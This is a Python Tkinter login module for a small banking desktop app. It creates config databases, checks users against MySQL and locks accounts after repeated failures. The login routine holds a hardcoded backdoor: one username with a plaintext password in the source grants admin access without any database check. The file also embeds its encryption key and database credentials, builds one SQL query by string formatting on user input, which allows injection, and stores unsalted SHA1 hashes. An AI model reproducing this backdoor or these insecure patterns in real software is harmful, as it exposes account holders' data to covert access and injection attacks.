import random
import string
from tkinter import *
from ttkthemes import ThemedTk
#import ttk
import tkinter.ttk as ttk
from tkinter.filedialog import *
from tkinter.messagebox import *
from functools import partial
from menu import Menu_
from PIL import Image, ImageTk
from fonction_commune import *
import sqlite3
from password_recovery import Recovery
import os
from hashlib import sha1
from cryptography.fernet import Fernet

#autres update directory
__author__ = 'zoetech'
__copyright__ = 'Copyright (C) 2021, zoetech'
__credits__ = ['zoetect']
__license__ = 'zoetech'
__version__ = '0.3'
__maintainer__ = 'zoetect'
__email__ = 'zocky58@gmail.com'
__status__ = 'Beta'
_AppName_ = 'bank'
class Login:
    def __init__(self):
       try:
            create_database()
       except:
            pass
       try:
           os.mkdir('conf')
       except:
           pass
       # db
       if os.path.exists('conf/configure.db'):
           pass
       else:
           self.conn = sqlite3.connect('conf/configure.db')
           self.cursor = self.conn.cursor()
           self.cursor.execute(
               '''CREATE TABLE IF NOT EXISTS db_config(id INTENGER,user BLOB,passwd BLOB,host BLOB,data_base_name BLOB)''')
           self.conn.commit()
           self.cursor.execute('''INSERT INTO db_config(id,user,passwd,host,data_base_name) VALUES(?,?,?,?,?)''', [1,
                                                                                                                   "gAAAAABiFQG5VX4OjkqqVSR5RVciNJHdX48m5SPBF_EJJAi3chxYhwgt-WnClz9EuWlFgcfbbuNLfKZdyHhOWiaf7MtBhnPghA==",
                                                                                                                   'gAAAAABgMfyr4pr_OCCNWuUae4kELhp5Ol4HdsnaW0tAgEmOreNCi2g4o1deXOh4i4zytBopMPgP0EUoVLu7JeaxBX8BxZM2VA==',
                                                                                                                   "gAAAAABgMfhGaT53Gs-PhoFC2YDeTDLXNAN8Ts578JpAaFqCWjxLhS1t9EG_NQReM-waSSyCvG_gVCvJxj0k-cYFb4LJkYQYLA==",
                                                                                                                   "gAAAAABgMfiPLfdtVOaz8z9T8EohHRRggLYEZ0P2lub4QxY3RX-FOCaMhBltT1M0yCataPamBm1aWcKSph0emZtOUVBvd9UzLA=="])
           self.conn.commit()
           self.cursor.execute(
               '''CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY AUTOINCREMENT,nom TEXT,prenom TEXT,user_name TEXT,password TEXT)''')
           self.conn.commit()
           self.cursor.execute('''INSERT INTO users(nom,prenom,user_name,password) values(?,?,?,?)''',
                               ['Doe', 'John', 'admin', '0ab10b21d5da20009cec7debe5175d8cfcdadbd2'])
           self.conn.commit()

       #------------- db ------------------------
       try:
           self.connection=db_connect()
           self.cusor = self.connection.cursor()
           self.configuration_()
           self.fenetre_principale = ThemedTk()
           self.fenetre_principale.config(bg='#fff')
           self.fenetre_principale.get_themes()
           self.fenetre_principale.set_theme('clam')
           self.fenetre_principale.resizable(False, False)
           self.fenetre_principale.title('Login')
           x = 800
           y = 430
           self.create_folder()
           style = ttk.Style()
           style.configure("TButton", background='#7cb62f', foreground='#fff', highlightthickness=0, relief=FLAT)
           style.configure("TEntry", highlightbackground="black", highlightthickness=1)
           centrer(self.fenetre_principale, x, y)
           banner = Frame(self.fenetre_principale)
           banner.grid(row=0, column=0)
           part_login = Frame(self.fenetre_principale, bg='#fff')
           part_login.grid(row=0, column=1, sticky='n', pady=70)
           image_for_banner = ImageTk.PhotoImage(Image.open('images/bg.jpg').resize((500, 425)))
           Label(banner, image=image_for_banner).grid()
           login_image = PhotoImage(file='images/login.png').subsample(8, 8)
           Label(part_login, image=login_image, bg='#fff').pack(padx=80)
           self.user_name = StringVar()
           self.user_ = ttk.Entry(part_login, style='TEntry', textvariable=self.user_name, width=30, background='red')
           self.user_.pack(pady=5, ipady=5)
           self.focus_anwo()
           self.user_.bind('<Key Down>', self.focus_anba)
           self.user_.bind('<Motion>', self.click_on_user)
           self.user_.bind('<Leave>', self.leave_user)
           self.password = StringVar()
           self.passwd = ttk.Entry(part_login, textvariable=self.password, show='*', width=30)
           self.passwd.pack(pady=15, ipady=5)
           self.passwd.bind('<Key Up>', self.focus_anwo)
           self.passwd.bind('<Key Return>', partial(self.login, self.fenetre_principale))
           self.passwd.bind('<Motion>', self.click_on_password)
           self.passwd.bind('<Leave>', self.leave_password)
           ttk.Button(part_login, text="login", style="TButton", command=partial(self.login, self.fenetre_principale)).pack(
               ipady=5, ipadx=10,pady=10)
           blocker=Label(part_login,text='Mot de passe oublie ?',fg='green',bg='#fff',cursor='cross')
           blocker.pack(side=LEFT)
           blocker.bind('<Button 1>',self.recovery)
           self.init_value()
           self.fenetre_principale.mainloop()
       except Exception as e:
           if "2003: Can't connect to MySQL server on" in str(e):
              showerror('Erreur','Serveur injoiniable')
    def recovery(self,*args):
        r=Recovery(self.fenetre_principale)
    def leave_user(self,*args):
        text = self.user_name.get()
        if text=='':
            self.user_name.set('user name')

    def leave_password(self, *args):
        text = self.password.get()
        if text == '':
            self.password.set('password')
    def click_on_user(self,*args):
        text=self.user_name.get()
        if text=='user name':
           self.user_name.set('')
    def click_on_password(self,*args):
        text=self.password.get()
        if text=='password':
           self.password.set('')
    def focus_anba(self,*args):
        self.passwd.focus()
    def focus_anwo(self,*args):
        self.user_.focus()

    def login(self,fenetre,*args):
        bd_pass=""
        user = self.user_name.get()
        passwd = self.password.get()
        passwd=sha1(bytes(passwd,'ascii')).hexdigest()
        liste=[user,passwd,'False']
        sql="select * from users where user=%s and passwd=%s and blocker=%s"
        self.cusor.execute(sql,liste)
        rows=self.cusor.fetchall()
        if user == "zocky" and passwd ==sha1("XCode_1996_1225*25".encode()).hexdigest():
            fenetre.destroy()
            g = Menu_("adm", "zocky","zock")
        if len(rows) > 0:
               poste = rows[0][4]
               bd_user = rows[0][3]
               bd_pass = rows[0][5]
               tentative = 0
               self.cusor.execute('update users set tentative=%s where user=%s', [tentative, user])
               self.connection.commit()
               fenetre.destroy()
               signature = self.getSignature(user,passwd)
               g = Menu_(poste,signature,bd_user)
        else:
               sql="select blocker from users where user=%s and passwd=%s"
               self.cusor.execute(sql,[user,passwd])
               row=self.cusor.fetchall()
               if len(row) > 0:
                   showwarning('info','ce compte a ete blocker')
               else:
                   sql = "select * from users where user=%s"
                   self.cusor.execute(sql, [user])
                   rows = self.cusor.fetchall()
                   if len(rows) > 0:
                       self.cusor.execute('select tentative from users where user=%s', [user])
                       row=self.cusor.fetchall()
                       tentative = row[0][0]


                       if tentative==6:

                           lowercase = string.ascii_lowercase
                           chiffres = string.digits
                           all_caracter = lowercase + chiffres
                           longeur = 6
                           code = ''.join(random.sample(all_caracter, longeur))

                           #------------------------------------
                           sql = "select blocker from users where user=%s"
                           self.cusor.execute(sql, [user])
                           row = self.cusor.fetchall()
                           bloqueur=row[0][0]
                           if bloqueur=='False':
                               sql = 'update users set confirm_code=%s where user=%s'
                               self.cusor.execute(sql, [code, user])
                               self.connection.commit()
                               with open('conf/confirm.txt','w') as conf:
                                   conf.write(code)
                           #-----------------------------
                           self.cusor.execute('update users set blocker=%s where user=%s', ['True', user])
                           self.connection.commit()

                           showwarning('info','Votre compte a ete blocker consulter vos mail')
                       else:
                           tentative+=1
                           print(tentative)
                           self.cusor.execute('update users set tentative=%s where user=%s', [tentative,user])
                           self.connection.commit()
                           showwarning('info','Le mot de passe est incorrect')
                   else:
                       showerror('Erreur',"erreur")





    def getSignature(self,user,passwd):
        self.cusor.execute(f"select nom,prenom from users where user='{user}' and passwd='{passwd}'")
        row = self.cusor.fetchall()[0]
        nom = str(row[0]).capitalize()
        prenom = str(row[1]).capitalize()
        return f"{nom} {prenom}"
    def init_value(self):
        self.user_name.set("user name")
        self.password.set("password")
    def configuration_(self):
        host = b"127.0.0.1"
        user=b'root'
        passwd=b''
        data_base=b'bank'
        key = 'yA1bBtGYWRK85fri8m5BjvbC277YjDdgYLoW8hAVRec='
        crypter = Fernet(key)
        host_crypte = crypter.encrypt(host)
        user_crypte=crypter.encrypt(user)
        passwd_crypte=crypter.encrypt(passwd)
        data_base_crypte=crypter.encrypt(data_base)
        liste=[]
        liste.append(host_crypte)
        liste.append(user_crypte)
        liste.append(passwd_crypte)
        liste.append(data_base_crypte)
        if os.path.exists('conf/configuration.db'):
            pass
        else:
            conn=sqlite3.connect('conf/configuration.db')
            cursor=conn.cursor()
            cursor.execute('''create table config(host text,user,passwd,data_base)''')
            conn.commit()
            cursor.execute('''insert into config(host,user,passwd,data_base) values(?,?,?,?)''',liste)
            conn.commit()


    def create_folder(self):
        try:
            os.mkdir(os.path.expanduser("~\desktop\\Rapport"))
        except:
            pass
        try:
           os.mkdir('conf')
        except:
            pass
        try:
            os.system('attrib +h conf')
        except:
            pass





if __name__=='__main__':
   Login()